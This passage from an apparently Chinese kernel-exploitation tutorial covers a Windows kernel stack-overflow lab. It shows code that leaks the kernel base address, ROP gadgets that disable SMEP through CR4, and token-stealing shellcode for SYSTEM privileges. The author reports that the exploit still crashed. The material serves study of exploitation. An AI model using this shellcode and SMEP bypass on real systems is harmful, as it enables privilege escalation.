
其获取内核基址采用`NtQuerySystemInformation`函数：

```c
typedef struct SYSTEM_MODULE {
  ULONG                Reserved1;
  ULONG                Reserved2;
  ULONG                Reserved3;
  PVOID                ImageBaseAddress;
  ULONG                ImageSize;
  ULONG                Flags;
  WORD Id;
  WORD                 Rank;
  WORD                 LoadCount;
  WORD                 NameOffset;
  CHAR                 Name[256];
}SYSTEM_MODULE,
*PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
  ULONG                ModulesCount;
  SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION,
*PSYSTEM_MODULE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
  SystemModuleInformation = 0xb
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS(WINAPI* PNtQuerySystemInformation)(
  __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
  __inout PVOID SystemInformation,
  __in ULONG SystemInformationLength,
  __out_opt PULONG ReturnLength
);
.......
INT64 get_kernel_base() {

  cout << "[>] Getting kernel base address..." << endl;

  //Get NtQuerySystemInformation Address
  PNtQuerySystemInformation NtQuerySystemInformation =
  (PNtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"),
  "NtQuerySystemInformation");

  if (!NtQuerySystemInformation) {
    cout << "[!] Failed to get the address of NtQuerySystemInformation." << endl;
    cout << "[!] Last error " << GetLastError() << endl;
    exit(1);
  }

  ULONG len = 0;

  //Get Buffer Length
  NtQuerySystemInformation(SystemModuleInformation,
  NULL,
  0,
  &len);

  //Allocate Memory
  PSYSTEM_MODULE_INFORMATION pModuleInfo = (PSYSTEM_MODULE_INFORMATION)
  VirtualAlloc(NULL,
  len,
  MEM_RESERVE | MEM_COMMIT,
  PAGE_EXECUTE_READWRITE);

  //Get SYSTEM_MODULE_INFORMATION
  NTSTATUS status = NtQuerySystemInformation(SystemModuleInformation,
  pModuleInfo,
  len,
  &len);

  if (status != (NTSTATUS)0x0) {
    cout << "[!] NtQuerySystemInformation failed!" << endl;
    exit(1);
  }

  PVOID kernelImageBase = pModuleInfo->Modules[0].ImageBaseAddress;

  cout << "[>] ntoskrnl.exe base address: 0x" << hex << kernelImageBase << endl;

  return (INT64)kernelImageBase;
}
```

之后Bypass SMEP采用修改`CR4`寄存器，置其第21位为0。据笔者环境，`CR4=00000000001506f8`，应修改为`00000000000506f8`，Gadgets如下：

```
pop     rcx;retn
//nt!HvlEndSystemInterrupt+20
00000000000506f8
//CR4 Value
mov     cr4, rcx;retn
//nt!KeFlushCurrentTbImmediately+17
```

笔者环境中`_EPROCESS`结构与Exp作者略有不同，故修改Shellcode如下：

```
"\x54\x50\x51\x52\x53\x55\x56\x57\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9C"
//PUSHAD
"\x65\x48\x8B\x14\x25\x88\x01\x00\x00"
//mov rdx, [gs:188h]       ; Get _ETHREAD pointer from KPCR
"\x4C\x8B\x82\xB8\x00\x00\x00"
//mov r8, [rdx + b8h]      ; _EPROCESS (kd> u PsGetCurrentProcess)
"\x4D\x8B\x88\xe8\x02\x00\x00"
//mov r9, [r8 + 2e8h]      ; ActiveProcessLinks list head
"\x49\x8B\x09"
//mov rcx, [r9]            ; Follow link to first process in list
//find_system_proc:
"\x48\x8B\x51\xF8"
//mov rdx, [rcx - 8]       ; Offset from ActiveProcessLinks to UniqueProcessId
"\x48\x83\xFA\x04"
//cmp rdx, 4               ; Process with ID 4 is System process
"\x74\x05"
//jz found_system          ; Found SYSTEM token
"\x48\x8B\x09"
//mov rcx, [rcx]           ; Follow _LIST_ENTRY Flink pointer
"\xEB\xF1"
//jmp find_system_proc     ; Loop
//found_system:
"\x48\x8B\x41\x70"
//mov rax, [rcx + 70h]     ; Offset from ActiveProcessLinks to Token
"\x24\xF0"
//and al, 0f0h             ; Clear low 4 bits of _EX_FAST_REF structure
"\x49\x89\x80\x58\x03\x00\x00"
//mov [r8 + 358h], rax     ; Copy SYSTEM token to current process's token
"\x9D\x41\x5F\x41\x5E\x41\x5D\x41\x5C\x41\x5B\x41\x5A\x41\x59\x41\x58\x5F\x5E\x5D\x5B\x5A\x59\x58\x5C"
//POPAD
"\x48\x83\xC4\x10"
//add rsp, 010h
"\x48\x31\xC0"
//xor rax, rax             ; NTSTATUS Status = STATUS_SUCCESS
"\xc3";
```

其他部分与上节思路基本一致，不再赘述。笔者构造的Exploit可以于目标虚拟机中执行，修改`CR4`及替换Token完成后恢复原执行环境，崩溃如下：

![](https://bbs.kanxue.com/upload/attach/202106/817966_EGKXUJSB7EH3MAJ.jpg)

由于知识储备有限，笔者尝试良久，未果。总结整体思路为：Get Kernel Base Address—>ROP(Modify CR4 value)—>Shellcode(User Space)。

## 0x04 参阅链接

- [I/O request packets—Microsoft Docs](https://bbs.kanxue.com/elink@9b1K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8$3y4K6i4K6u0W2L8h3W2U0M7X3!0K6L8$3k6@1i4K6u0W2j5$3!0E0i4K6u0r3k6h3&6Q4x3X3c8#2M7#2)9J5c8Y4N6A6L8X3c8G2N6%4y4Q4x3X3c8Z5j5i4u0V1N6$3q4J5k6g2)9J5c8X3c8J5K9i4k6W2M7Y4y4Q4x3V1k6Y4k6i4c8@1K9h3&6Y4M7%4c8S2M7Y4c8W2k6q4)9J5c8X3c8J5K9i4k6W2M7Y4y4Q4x3V1k6Y4k6i4c8@1K9h3&6Y4M7%4c8S2M7Y4c8W2k6q4)9J5c8X3c8J5K9i4k6W2M7Y4y4Q4x3V1k6Y4k6i4c8@1K9h3&6Y4M7%4c8S2M7Y4c8W2k6q4)9J5c8X3W2Q4x3X3c8G2i4K6u0V1M7X3g2I4N6h3g2K6N6q4)9J5k6s2m8S2j5$3E0W2N6s2x3`.)

- [Device nodes and device stacks—Microsoft Docs](https://bbs.kanxue.com/elink@d56K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8$3y4K6i4K6u0W2L8h3W2U0M7X3!0K6L8$3k6@1i4K6u0W2j5$3!0E0i4K6u0r3k6h3&6Q4x3X3c8#2M7#2)9J5c8Y4N6A6L8X3c8G2N6%4y4Q4x3X3c8Z5j5i4u0V1N6$3q4J5k6g2)9J5c8X3c8J5K9i4k6W2M7Y4y4Q4x3V1k6Y4k6i4c8@1K9h3&6Y4M7%4c8S2M7Y4c8W2k6q4)9J5c8X3c8W2N6X3W2U0k6g2)9J5k6r3&6G2k6r3g2K6i4K6u0V1j5h3&6V1i4K6u0V1k6r3g2$3K9h3y4W2i4K6u0V1M7%4c8S2j5$3E0K6)

- [HelloWorld driver—Github](https://bbs.kanxue.com/elink@5c2K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4y4@1i4K6u0W2k6$3W2@1K9s2g2T1i4K6u0W2j5$3!0E0i4K6u0r3K9r3q4K6K9r3g2J5k6i4A6S2k6r3g2Q4x3V1k6W2k6e0q4S2x3e0V1I4y4r3c8X3j5e0t1&6x3U0m8U0y4K6N6W2z5o6u0X3k6o6f1J5y4K6p5%4j5e0S2X3j5R3`.`.)

- [Write a Hello World Windows Driver (KMDF)—Microsoft Docs](https://bbs.kanxue.com/elink@fb4K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8$3y4K6i4K6u0W2L8h3W2U0M7X3!0K6L8$3k6@1i4K6u0W2j5$3!0E0i4K6u0r3P5X3S2Q4x3X3c8U0L8W2)9J5c8Y4N6A6L8X3c8G2N6%4y4Q4x3X3c8Z5j5i4u0V1N6$3q4J5k6g2)9J5c8X3c8J5K9i4k6W2M7Y4y4Q4x3V1k6Y4k6i4c8@1K9h3&6Y4M7%4c8S2M7Y4c8W2k6q4)9J5c8Y4N6J5K9i4c8A6L8X3N6Q4x3X3c8S2i4K6u0V1N6X3g2J5P5g2)9J5k6s2y4E0j5h3I4D9i4K6u0V1K9$3#2V1k6W2)9J5k6q4)9J5k6r3c8J5K9i4k6W2M7R3`.`.)

- [Kernel Exploitation -> Stack Overflow—FuzzySecurity](https://bbs.kanxue.com/elink@24cK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2X3N6i4A6*7P5i4y4W2j5%4g2J5K9i4c8&6i4K6u0W2j5$3!0E0i4K6u0r3N6s2g2@1L8%4u0A6j5h3I4K6i4K6u0r3k6i4S2H3c8r3g2$3i4K6u0r3x3e0c8Q4x3X3g2Z5N6r3#2D9)

- [Windows SMEP Bypass:U=S—Core Security](https://bbs.kanxue.com/elink@4daK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2U0L8%4u0W2M7$3g2U0N6i4u0A6N6s2W2Q4x3X3g2U0L8$3#2Q4x3V1k6K6K9i4c8W2M7#2)9J5c8X3c8W2k6X3q4#2L8s2c8Q4x3V1k6X3K9h3I4W2M7#2)9J5c8U0t1H3x3U0m8Q4x3X3b7H3y4W2)9J5c8W2N6A6L8X3c8G2N6%4y4Q4x3U0f1J5x3q4y4y4c8g2m8Q4x3U0f1J5x3r3u0&6M7r3q4K6M7#2)9J5y4e0t1H3g2g2)9J5y4e0t1H3k6i4q4#2j5h3I4K6i4K6t1#2x3U0m8e0i4K6g2X3x3q4)9J5k6i4m8V1k6R3`.`.)
